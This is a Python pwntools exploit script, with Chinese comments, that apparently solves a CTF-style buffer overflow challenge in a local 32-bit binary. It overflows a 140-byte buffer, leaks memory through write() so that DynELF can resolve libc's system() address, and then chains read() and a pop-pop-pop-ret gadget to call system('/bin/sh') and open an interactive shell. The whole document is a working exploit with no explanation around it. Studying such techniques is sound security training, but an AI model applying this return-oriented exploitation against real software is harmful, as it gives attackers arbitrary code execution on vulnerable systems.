from pwn import *

# DynELF函数搜索system地址
elf = ELF('./x86')
plt_write = elf.symbols['write']
vulfun_addr = 0x08049172

def leak(address):
    payload1 = b'\x90'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    print("\n###sending payload1 ...###")
    p.send(payload1)
    data = p.recv(4)
    print("%#x => %s" % (address, data.hex()))
    return data

p = process('./x86')
d = DynELF(leak, elf=ELF('./x86'))
system_addr = d.lookup('system', 'libc')
print("\nsystem_addr=" + hex(system_addr))

# 在bss段写入'/bin/sh',并使用pppr执行system('/bin/sh’)
plt_read = elf.symbols['read']
bss_addr = 0x0804c020
pppr = 0x08049249

payload2 = b'\x90'*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)

print("\n###sending payload2 ...###")
p.send(payload2)
p.send("/bin/sh\0")
p.interactive()